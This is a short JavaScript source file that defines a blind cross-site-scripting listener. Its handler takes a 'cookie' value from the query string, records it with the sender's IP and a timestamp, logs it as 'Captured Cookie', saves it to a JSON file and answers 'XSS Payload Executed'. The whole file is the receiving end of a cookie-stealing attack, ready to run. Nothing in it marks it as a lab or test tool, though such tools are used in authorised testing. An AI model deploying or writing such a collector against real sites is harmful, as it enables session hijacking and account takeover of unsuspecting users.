import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const logsDir = path.join(__dirname, '../../logs');

// Ensure the logs directory exists
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir);
}

export const bxssListener = (req, res) => {
  const { cookie } = req.query;
  const logEntry = {
    cookie,
    ip: req.ip,
    timestamp: new Date().toISOString(),
  };

  console.log('Captured Cookie:', logEntry);

  // Optionally save the log to a file
  const logFilePath = path.join(logsDir, 'bxss-logs.json');
  let logs = [];
  if (fs.existsSync(logFilePath)) {
    logs = JSON.parse(fs.readFileSync(logFilePath, 'utf8'));
  }
  logs.push(logEntry);
  fs.writeFileSync(logFilePath, JSON.stringify(logs, null, 2));

  res.send('<h1>XSS Payload Executed</h1>');
};
